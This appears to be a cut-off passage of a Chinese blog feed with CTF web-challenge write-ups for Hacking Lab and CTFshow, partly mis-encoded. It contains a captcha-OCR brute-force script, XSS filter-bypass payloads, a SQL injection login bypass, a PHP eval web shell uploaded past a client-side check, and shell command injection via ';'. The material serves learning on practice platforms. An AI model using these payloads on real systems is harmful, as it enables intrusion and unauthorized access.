get_url<span class="token punctuation">(</span>num<span class="token punctuation">,</span> code<span class="token punctuation">)</span>        num <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">def</span> <span class="token function">get_code</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlretrieve<span class="token punctuation">(</span><span class="token string">'http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/vcode.php'</span><span class="token punctuation">,</span> <span class="token string">'1.png'</span><span class="token punctuation">)</span>    code <span class="token operator">=</span> pytesseract<span class="token punctuation">.</span>image_to_string<span class="token punctuation">(</span>Image<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">'1.png'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    code <span class="token operator">=</span> code<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># print(code)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> len<span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'éªŒè¯ç æ˜¯'</span><span class="token punctuation">,</span> code<span class="token punctuation">)</span>            <span class="token keyword">return</span> code            <span class="token comment" spellcheck="true"># print(code)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"é‡æ–°è·å–éªŒè¯ç ï¼"</span><span class="token punctuation">)</span>            get_code<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> UnicodeEncodeError<span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">get_url</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> code<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'13388886666'</span><span class="token punctuation">,</span> <span class="token string">'mobi_code'</span><span class="token punctuation">:</span> num<span class="token punctuation">,</span> <span class="token string">'user_code'</span><span class="token punctuation">:</span> code<span class="token punctuation">,</span> <span class="token string">'Login'</span><span class="token punctuation">:</span> <span class="token string">'submit'</span><span class="token punctuation">}</span>    res <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>head<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> u<span class="token string">'error'</span> <span class="token operator">not</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> <span class="token string">'å¯†ç æ˜¯'</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> <span class="token string">'å¯†ç æ˜¯'</span><span class="token punctuation">,</span> num<span class="token punctuation">,</span> <span class="token string">'---é”™è¯¯'</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># print("æ­£åœ¨å°è¯•...")</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="XSSå…³"><a href="#XSSå…³" class="headerlink" title="XSSå…³"></a>XSSå…³</h1><h2 id="XSSåŸºç¡€å…³"><a href="#XSSåŸºç¡€å…³" class="headerlink" title="XSSåŸºç¡€å…³"></a>XSSåŸºç¡€å…³</h2><p>XSSåŸºç¡€:å¾ˆå®¹æ˜“å°±å¯ä»¥è¿‡å…³.XSSç±»é¢˜ç›®å¿…é¡»åœ¨å¹³å°ç™»å½•æ‰èƒ½è¿›è¡Œ.ç™»å½•åœ°å€è¯·å‚è€ƒå·¦ä¾§<å­ç³»ç»Ÿ></p><p>payloadï¼š</p><pre><code>&lt;script&gt;alert(&#39;1&#39;);&lt;/script&gt;</code></pre><p>æºä»£ç æ–‡ä»¶ä¸­å¾—åˆ°ï¼šalert("Please use alert(HackingLab)!!");</p><p>payloadï¼š</p><pre><code>&lt;script&gt;alert(HackingLab);&lt;/script&gt;</code></pre><p>keyï¼šmyxssteststart!</p><h2 id="XSSåŸºç¡€2-ç®€å•ç»•è¿‡"><a href="#XSSåŸºç¡€2-ç®€å•ç»•è¿‡" class="headerlink" title="XSSåŸºç¡€2:ç®€å•ç»•è¿‡"></a>XSSåŸºç¡€2:ç®€å•ç»•è¿‡</h2><p>payloadï¼š</p><pre><code>&lt;script&gt;alert(HackingLab);&lt;/script&gt;</code></pre><p>åº”è¯¥è¿›è¡Œäº†æ£€æŸ¥ï¼šXSS_SCRIPT_DETECTED!!!è¢«å‘ç°äº†</p><p>payloadï¼š</p><pre><code>&lt;h1&gt;666&lt;/h1&gt;</code></pre><p>å¾—åˆ°å®ç°å¤§æ ‡é¢˜</p><pre><code>&lt;img&gt; æ ‡ç­¾å®šä¹‰ HTML é¡µé¢ä¸­çš„å›¾åƒã€‚&lt;img&gt; æ ‡ç­¾æœ‰ä¸¤ä¸ªå¿…éœ€çš„å±æ€§ï¼šsrcï¼ˆè§„å®šæ˜¾ç¤ºå›¾åƒçš„ URLï¼Œå€¼ä¸ºURLï¼‰å’Œ altï¼ˆè§„å®šå›¾åƒçš„æ›¿ä»£æ–‡æœ¬ï¼Œå€¼ä¸ºtextï¼‰</code></pre><p>payloadï¼š</p><pre><code>&lt;img src=x onclick=alert(HackingLab)&gt;</code></pre><p>key is: xss2test2you</p><p><a href="https://www.runoob.com/tags/ref-eventattributes.html">HTMLå…¨å±€äº‹ä»¶å±æ€§</a></p><p><strong>HTML 4 çš„æ–°ç‰¹æ€§ä¹‹ä¸€æ˜¯å¯ä»¥ä½¿ HTML äº‹ä»¶è§¦å‘æµè§ˆå™¨ä¸­çš„è¡Œä¸ºï¼Œæ¯”æ–¹è¯´å½“ç”¨æˆ·ç‚¹å‡»æŸä¸ª HTML å…ƒç´ æ—¶å¯åŠ¨ä¸€æ®µ JavaScriptã€‚</strong></p><h2 id="XSSåŸºç¡€3-æ£€æµ‹ä¸æ„é€ "><a href="#XSSåŸºç¡€3-æ£€æµ‹ä¸æ„é€ " class="headerlink" title="XSSåŸºç¡€3:æ£€æµ‹ä¸æ„é€ "></a>XSSåŸºç¡€3:æ£€æµ‹ä¸æ„é€ </h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B402%E6%9C%8817%E6%97%A51133_1.png" alt=""></p><p>payloadï¼ˆç»†èŠ‚é—­åˆï¼‰ï¼š</p><pre><code>alert&#39; onmousemove=alert(HackingLab)&gt;</code></pre><p><a href="https://www.runoob.com/tags/ev-onmouseover.html">onmouseover</a>ï¼šå½“é¼ æ ‡æŒ‡é’ˆç§»è‡³å…ƒç´ ä¹‹ä¸Šæ—¶è¿è¡Œè„šæœ¬</p><p><a href="https://www.runoob.com/tags/ev-onmousemove.html">onmousemove</a>ï¼šå½“é¼ æ ‡æŒ‡é’ˆç§»åŠ¨æ—¶è¿è¡Œè„šæœ¬</p><p>è¿™é‡Œæ˜¯å½“valueçš„å€¼æ˜¯æ•æ„Ÿå€¼æ—¶ï¼Œåè¾¹çš„è½½è·ä¸ä¼šè¢«è¿‡æ»¤</p><h2 id="Principleå¾ˆé‡è¦çš„XSS"><a href="#Principleå¾ˆé‡è¦çš„XSS" class="headerlink" title="Principleå¾ˆé‡è¦çš„XSS"></a>Principleå¾ˆé‡è¦çš„XSS</h2><p>åˆ†å€¼: 300</p><p>åŸç†/åŸåˆ™/ç†å¿µå¾ˆé‡è¦.....ä¸æ˜¯æ‰€æœ‰çš„xsséƒ½å«ç‰¹ä»‘è‹.. ^_^<br>Take it easy!</p><p>æŸ¥çœ‹æºä»£ç ï¼š  </p><pre><code>Welcome !&lt;a href=&#39;&#39;&gt;Edit Profile(XSS HERE!)&lt;/a&gt; </code></pre><p>ä¹Ÿå°±æ˜¯è¯´è¶…é“¾æ¥ä¸ºä¸€ä¸ªæ³¨å…¥ç‚¹</p><p>payloadï¼š</p><pre><code>alert&#39;onmouseover=alert(HackingLab)&gt;javasc&lt;c&gt;ript:al&lt;c&gt;ert(HackingLab) &#39; onmouseover=al&lt;c&gt;ert(HackingLab)&gt;</code></pre><p><a href="https://blog.csdn.net/Jacob12774/article/details/84778322?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control">wp</a></p><h2 id="å…³äºxssçš„å…¶ä»–æ¶æ„ä»£ç "><a href="#å…³äºxssçš„å…¶ä»–æ¶æ„ä»£ç " class="headerlink" title="å…³äºxssçš„å…¶ä»–æ¶æ„ä»£ç "></a>å…³äºxssçš„å…¶ä»–æ¶æ„ä»£ç </h2><p>1.å¼¹çª—è·¨ç«™ï¼š</p><pre><code>&lt;script&gt;window.open(&#39;http//www.xxx.com&#39;,&#39;width=200,height=200â€™)&lt;/script&gt;</code></pre><h1 id="æ³¨å…¥å…³-ç¯å¢ƒå´©äº†"><a href="#æ³¨å…¥å…³-ç¯å¢ƒå´©äº†" class="headerlink" title="æ³¨å…¥å…³(ç¯å¢ƒå´©äº†)"></a>æ³¨å…¥å…³(ç¯å¢ƒå´©äº†)</h1><h2 id="æœ€ç®€å•çš„SQLæ³¨å…¥"><a href="#æœ€ç®€å•çš„SQLæ³¨å…¥" class="headerlink" title="æœ€ç®€å•çš„SQLæ³¨å…¥"></a>æœ€ç®€å•çš„SQLæ³¨å…¥</h2><pre><code>username=&#39;admin&#39; or 1=1#&#39;password=&#39;123&#39;vcode=&#39;&#39;</code></pre><p><a href="http://blog.spoock.com/2016/06/28/sql-injection-1/">sqlæ³¨å…¥å¿…å¤‡çŸ¥è¯†</a></p><h1 id="ä¸Šä¼ å…³"><a href="#ä¸Šä¼ å…³" class="headerlink" title="ä¸Šä¼ å…³"></a>ä¸Šä¼ å…³</h1><h2 id="è¯·ä¸Šä¼ ä¸€å¼ jpgæ ¼å¼çš„å›¾ç‰‡"><a href="#è¯·ä¸Šä¼ ä¸€å¼ jpgæ ¼å¼çš„å›¾ç‰‡" class="headerlink" title="è¯·ä¸Šä¼ ä¸€å¼ jpgæ ¼å¼çš„å›¾ç‰‡"></a>è¯·ä¸Šä¼ ä¸€å¼ jpgæ ¼å¼çš„å›¾ç‰‡</h2><p>åˆ†å€¼: 100</p><p>åªèƒ½ä¸Šä¼ jpgæ ¼å¼çš„å›¾ç‰‡å“¦~ï¼</p><pre><code>&lt;?php eval($_POST[&#39;666&#39;]);?&gt;</code></pre><p>åªæ˜¯å‰ç«¯éªŒè¯ï¼ŒbpæŠ“åŒ…ç»•è¿‡å³å¯</p><h2 id="è¯·ä¸Šä¼ ä¸€å¼ jpgæ ¼å¼çš„å›¾ç‰‡-1"><a href="#è¯·ä¸Šä¼ ä¸€å¼ jpgæ ¼å¼çš„å›¾ç‰‡-1" class="headerlink" title="è¯·ä¸Šä¼ ä¸€å¼ jpgæ ¼å¼çš„å›¾ç‰‡"></a>è¯·ä¸Šä¼ ä¸€å¼ jpgæ ¼å¼çš„å›¾ç‰‡</h2><p>åˆ†å€¼: 150</p><p>åªèƒ½æ˜¯jpgå“¦ï¼</p><p>åŒä¸Š</p><h2 id="è¯·ä¸Šä¼ ä¸€å¼ jpgæ ¼å¼çš„å›¾ç‰‡-2"><a href="#è¯·ä¸Šä¼ ä¸€å¼ jpgæ ¼å¼çš„å›¾ç‰‡-2" class="headerlink" title="è¯·ä¸Šä¼ ä¸€å¼ jpgæ ¼å¼çš„å›¾ç‰‡"></a>è¯·ä¸Šä¼ ä¸€å¼ jpgæ ¼å¼çš„å›¾ç‰‡</h2><p>åˆ†å€¼: 150</p><p>åªèƒ½æ˜¯jpgå“¦ï¼</p><p>bpä¿®æ”¹ä½1.jpg.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">var</span> filename<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">var</span> str<span class="token operator">=</span>filename<span class="token punctuation">.</span>value<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">var</span> ext<span class="token operator">=</span>str<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>ext<span class="token operator">===</span><span class="token string">'jpg'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"è¯·ä¸Šä¼ ä¸€å¼ JPGæ ¼å¼çš„å›¾ç‰‡ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯¹.è¿›è¡Œäº†åˆ†ç¦»ï¼Œåˆ¤æ–­ä»¥.ä¸ºåˆ†å‰²ç¬¦å·ä¸­çš„ç¬¬äºŒä½æ˜¯ä¸æ˜¯jpg</p></script></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowä¹‹Web(ä¸€)</title>
      <link href="/2021/02/09/ctf-zhi-ming-ling-zhi-xing-xin-xi-xie-lu/"/>
      <url>/2021/02/09/ctf-zhi-ming-ling-zhi-xing-xin-xi-xie-lu/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1387581250&auto=1&height=66"></iframe><h1 id="2021-02-09"><a href="#2021-02-09" class="headerlink" title="2021-02-09"></a>2021-02-09</h1><h2 id="èŒæ–°èµ›â€”â€”ç­¾åˆ°é¢˜"><a href="#èŒæ–°èµ›â€”â€”ç­¾åˆ°é¢˜" class="headerlink" title="èŒæ–°èµ›â€”â€”ç­¾åˆ°é¢˜"></a>èŒæ–°èµ›â€”â€”ç­¾åˆ°é¢˜</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span>"curl https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//".$_GET['url'].".ctf.show");</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>getä¼ é€’å‚æ•°å¿…é¡»è¦æœ‰URLï¼Œç„¶åæ ¹æ®URLé‡Œé¢çš„å†…å®¹åœ¨ç³»ç»Ÿä¸‹è‡ªåŠ¨æ‰§è¡Œcurlå‘½ä»¤ï¼Œè§£é¢˜çš„å·§å¦™ä¹‹å¤„åœ¨äºé‡‡ç”¨åˆ†å‰²ç¬¦â€œ;â€ï¼Œåˆ†å¼€æ‰§è¡Œå‘½ä»¤ï¼Œæ„é€ ï¼š</p><pre><code>http://6ccdf3cc-acbc-4f35-9088-29fa2249cb64.chall.ctf.show:8080/?url=1;ls;www</code></pre><p>å›æ˜¾ï¼šflag index.phpï¼Œç»§ç»­æ„é€ ï¼š</p><pre><code>http://6ccdf3cc-acbc-4f35-9088-29fa2249cb64.chall.ctf.show:8080/?url=1;cat flag;www</code></pre><h1 id="2021-02-18ï¼ˆä¿¡æ¯æœé›†1-20ï¼‰"><a href="#2021-02-18ï¼ˆä¿¡æ¯æœé›†1-20ï¼‰" class="headerlink" title="2021-02-18ï¼ˆä¿¡æ¯æœé›†1-20ï¼‰"></a>2021-02-18ï¼ˆä¿¡æ¯æœé›†1-20ï¼‰</h1><h2 id="å‰å°JSç»•è¿‡"><a href="#å‰å°JSç»•è¿‡" class="headerlink" title="å‰å°JSç»•è¿‡"></a>å‰å°JSç»•è¿‡</h2><p><strong>jså‰å°æ‹¦æˆª === æ— æ•ˆæ“ä½œ</strong></p><p>å½“æ— æ³•f12æˆ–è€…å³é”®æŸ¥çœ‹æºä»£ç çš„æ—¶å€™å¯ä»¥åœ¨URLæ view-source:http://ç½‘ç«™/ æŸ¥çœ‹æºç </p><h2 id="åè®®å¤´ä¿¡æ¯æ³„éœ²"><a href="#åè®®å¤´ä¿¡æ¯æ³„éœ²" class="headerlink" title="åè®®å¤´ä¿¡æ¯æ³„éœ²"></a>åè®®å¤´ä¿¡æ¯æ³„éœ²</h2><p>æ²¡æ€è·¯çš„æ—¶å€™æŠ“ä¸ªåŒ…çœ‹çœ‹ï¼Œå¯èƒ½ä¼šæœ‰æ„å¤–æ”¶è·</p><h2 id="robotsåå°æ³„éœ²"><a href="#robotsåå°æ³„éœ²" class="headerlink" title="robotsåå°æ³„éœ²"></a>robotsåå°æ³„éœ²</h2><p>robots.txtæ–‡ä»¶</p><h2 id="phpsæºç æ³„éœ²"><a href="#phpsæºç æ³„éœ²" class="headerlink" title="phpsæºç æ³„éœ²"></a>phpsæºç æ³„éœ²</h2><p><strong>phpsæºç æ³„éœ²æœ‰æ—¶å€™èƒ½å¸®ä¸Šå¿™</strong></p><p>å…³äº phps,phps å…¶å®å°±æ˜¯ PHP çš„æºä»£ç æ–‡ä»¶, é€šå¸¸ç”¨äºæä¾›ç»™ç”¨æˆ·æŸ¥çœ‹ PHP ä»£ç , å› ä¸ºç”¨æˆ·æ— æ³•ç›´æ¥é€šè¿‡ Web æµè§ˆå™¨çœ‹åˆ° PHP æ–‡ä»¶çš„å†…å®¹, æ‰€ä»¥éœ€è¦ç”¨ phps æ–‡ä»¶ä»£æ›¿. å…¶å®, åªè¦ä¸ç”¨ PHP ç­‰å·²ç»åœ¨æœåŠ¡å™¨ä¸­æ³¨å†Œè¿‡çš„ MIME ç±»å‹ä¸ºæ–‡ä»¶å³å¯, ä½†ä¸ºäº†å›½é™…é€šç”¨, æ‰€ä»¥æ‰ç”¨äº† phps æ–‡ä»¶ç±»å‹.</p><p>è®¿é—® index.phps, ä¸‹è½½ä¸‹æ¥æŸ¥çœ‹æºä»£ç , å³å¯å¾—åˆ° flag</p><h2 id="æºç å‹ç¼©åŒ…æ³„éœ²"><a href="#æºç å‹ç¼©åŒ…æ³„éœ²" class="headerlink" title="æºç å‹ç¼©åŒ…æ³„éœ²"></a>æºç å‹ç¼©åŒ…æ³„éœ²</h2><p><strong>è§£å‹æºç åˆ°å½“å‰ç›®å½•ï¼Œæµ‹è¯•æ­£å¸¸ï¼Œæ”¶å·¥</strong></p><p><a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p><h2 id="ç‰ˆæœ¬æ§åˆ¶æ³„éœ²æºç "><a href="#ç‰ˆæœ¬æ§åˆ¶æ³„éœ²æºç " class="headerlink" title="ç‰ˆæœ¬æ§åˆ¶æ³„éœ²æºç "></a>ç‰ˆæœ¬æ§åˆ¶æ³„éœ²æºç </h2><p><strong>ç‰ˆæœ¬æ§åˆ¶å¾ˆé‡è¦ï¼Œä½†ä¸è¦éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒæ›´é‡è¦ã€‚</strong></p><p>/.gitï¼ˆå¯ä»¥ç”¨dirsearchæ‰«æï¼‰</p><h2 id="ç‰ˆæœ¬æ§åˆ¶æ³„éœ²æºç 2"><a href="#ç‰ˆæœ¬æ§åˆ¶æ³„éœ²æºç 2" class="headerlink" title="ç‰ˆæœ¬æ§åˆ¶æ³„éœ²æºç 2"></a>ç‰ˆæœ¬æ§åˆ¶æ³„éœ²æºç 2</h2><p><strong>ç‰ˆæœ¬æ§åˆ¶å¾ˆé‡è¦ï¼Œä½†ä¸è¦éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒæ›´é‡è¦ã€‚</strong></p><p>è¿™æ¬¡æˆ‘çŒœæ˜¯/.svnï¼ˆæ˜¯äº†ï¼‰</p><h2 id="vimä¸´æ—¶æ–‡ä»¶æ³„éœ²"><a href="#vimä¸´æ—¶æ–‡ä»¶æ³„éœ²" class="headerlink" title="vimä¸´æ—¶æ–‡ä»¶æ³„éœ²"></a>vimä¸´æ—¶æ–‡ä»¶æ³„éœ²</h2><p><strong>å‘ç°ç½‘é¡µæœ‰ä¸ªé”™åˆ«å­—ï¼Ÿèµ¶ç´§åœ¨ç”Ÿäº§ç¯å¢ƒvimæ”¹ä¸‹ï¼Œä¸å¥½ï¼Œæ­»æœºäº†</strong></p><p>ç¨‹åºå‘˜ä½¿ç”¨vimç¼–è¾‘å™¨ç¼–å†™ä¸€ä¸ª<code>index.php</code>æ–‡ä»¶æ—¶ï¼Œä¼šæœ‰ä¸€ä¸ª<code>.index.php.swp</code>æ–‡ä»¶ï¼Œå¦‚æœæ–‡ä»¶æ­£å¸¸é€€å‡ºï¼Œåˆ™è¯¥æ–‡ä»¶è¢«åˆ é™¤ï¼Œå¦‚æœå¼‚å¸¸é€€å‡ºï¼Œè¯¥æ–‡ä»¶åˆ™ä¼šä¿å­˜ä¸‹æ¥ï¼Œè¯¥æ–‡ä»¶å¯ä»¥ç”¨æ¥æ¢å¤å¼‚å¸¸é€€å‡ºçš„index.phpï¼ŒåŒæ—¶å¤šæ¬¡æ„å¤–é€€å‡ºå¹¶ä¸ä¼šè¦†ç›–æ—§çš„<code>.swp</code>æ–‡ä»¶ï¼Œè€Œæ˜¯ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„ï¼Œä¾‹å¦‚<code>.swo</code>æ–‡ä»¶ã€‚</p><p>ç”¨vimç¼–è¾‘æ—¶ï¼Œä¸´æ—¶çš„ç¼“å­˜æ–‡ä»¶ä¸º/.swp/.swn/.swo</p><h2 id="cookieæ³„éœ²"><a href="#cookieæ³„éœ²" class="headerlink" title="cookieæ³„éœ²"></a>cookieæ³„éœ²</h2><p><strong>cookie åªæ˜¯ä¸€å—é¥¼å¹²ï¼Œä¸èƒ½å­˜æ”¾ä»»ä½•éšç§æ•°æ®</strong></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B402%E6%9C%8818%E6%97%A51341_1.png" alt></p><p>ctfshow{86798bd4-7472-4782-ab08-4ff05ae8418a}</p><h2 id="åŸŸåtxtè®°å½•æ³„éœ²"><a href="#åŸŸåtxtè®°å½•æ³„éœ²" class="headerlink" title="åŸŸåtxtè®°å½•æ³„éœ²"></a>åŸŸåtxtè®°å½•æ³„éœ²</h2><p><strong>åŸŸåå…¶å®ä¹Ÿå¯ä»¥éšè—ä¿¡æ¯ï¼Œæ¯”å¦‚ctfshow.com å°±éšè—äº†ä¸€æ¡ä¿¡æ¯</strong></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B402%E6%9C%8818%E6%97%A51346_2.png" alt></p><p><a href="http://www.jsons.cn/nslookup/" target="_blank" rel="noopener">åœ¨çº¿åŸŸåè§£æè®°å½•</a></p><h2 id="æ•æ„Ÿä¿¡æ¯å…¬å¸ƒ"><a href="#æ•æ„Ÿä¿¡æ¯å…¬å¸ƒ" class="headerlink" title="æ•æ„Ÿä¿¡æ¯å…¬å¸ƒ"></a>æ•æ„Ÿä¿¡æ¯å…¬å¸ƒ</h2><p><strong>æœ‰æ—¶å€™ç½‘ç«™ä¸Šçš„å…¬å¼€ä¿¡æ¯ï¼Œå°±æ˜¯ç®¡ç†å‘˜å¸¸ç”¨å¯†ç </strong></p><p>ç”¨dirsearchæ‰«æå¾—åˆ°åå°/admin</p><p>ä¿¡æ¯æœé›†åˆ°çš„æœ‰ç”¨ä¿¡æ¯ï¼š</p><p>Help Line Number : 372619038</p><p>eflyer</p><p>åˆ©ç”¨ï¼š</p><p>usernameï¼šadmin  passwordï¼š372619038</p><h2 id="å†…éƒ¨æŠ€æœ¯æ–‡æ¡£æ³„éœ²"><a href="#å†…éƒ¨æŠ€æœ¯æ–‡æ¡£æ³„éœ²" class="headerlink" title="å†…éƒ¨æŠ€æœ¯æ–‡æ¡£æ³„éœ²"></a>å†…éƒ¨æŠ€æœ¯æ–‡æ¡£æ³„éœ²</h2><p><strong>æŠ€æœ¯æ–‡æ¡£é‡Œé¢ä¸è¦å‡ºç°æ•æ„Ÿä¿¡æ¯ï¼Œéƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒååŠæ—¶ä¿®æ”¹é»˜è®¤å¯†ç </strong></p><p>æŠ€æœ¯æ–‡æ¡£ï¼šdocument.pdf</p><p>é»˜è®¤åå°åœ°å€ï¼š<a href="http://your-domain/system1103/login.php" target="_blank" rel="noopener">http://your-domain/system1103/login.php</a> </p><p>é»˜è®¤ç”¨æˆ·åï¼šadmin </p><p>é»˜è®¤å¯†ç ï¼šadmin1103</p><p>è®¿é—®/system1103/login.php å­ç›®å½•ï¼Œå¾—åˆ°ç™»å½•æ¡†è¾“å…¥è´¦å·å¯†ç å³å¯</p><h2 id="ç¼–è¾‘å™¨é…ç½®ä¸å½“"><a href="#ç¼–è¾‘å™¨é…ç½®ä¸å½“" class="headerlink" title="ç¼–è¾‘å™¨é…ç½®ä¸å½“"></a>ç¼–è¾‘å™¨é…ç½®ä¸å½“</h2><p><strong>æœ‰æ—¶å€™æºç é‡Œé¢å°±èƒ½ä¸ç»æ„é—´æ³„éœ²é‡è¦(editor)çš„ä¿¡æ¯,é»˜è®¤é…ç½®å®³æ­»äºº</strong></p><p>/editoræ‰“å¼€</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B402%E6%9C%8818%E6%97%A51418_3.png" alt></p><p>/editor/attached/file/var/www/html/nothinghere/fl000g.txt</p><p>è®¿é—®</p><p>nothinghere/fl000g.txt</p><h2 id="å¯†ç é€»è¾‘è„†å¼±"><a href="#å¯†ç é€»è¾‘è„†å¼±" class="headerlink" title="å¯†ç é€»è¾‘è„†å¼±"></a>å¯†ç é€»è¾‘è„†å¼±</h2><p><strong>å…¬å¼€çš„ä¿¡æ¯æ¯”å¦‚é‚®ç®±ï¼Œå¯èƒ½é€ æˆä¿¡æ¯æ³„éœ²ï¼Œäº§ç”Ÿä¸¥é‡åæœ</strong></p><p><a href="mailto:1156631961@qq.com" target="_blank" rel="noopener">1156631961@qq.com</a></p><p>åŠ å¥½å‹çœ‹çœ‹å—ï¼Œå¾—åˆ°ä¿¡æ¯ä¸ºï¼šåœ¨è¥¿å®‰</p><p>/adminå¯†ä¿é—®é¢˜ï¼šè¥¿å®‰</p><p>æ‚¨çš„å¯†ç å·²é‡ç½®ä¸ºadmin7789</p><h2 id="æ¢é’ˆæ³„éœ²"><a href="#æ¢é’ˆæ³„éœ²" class="headerlink" 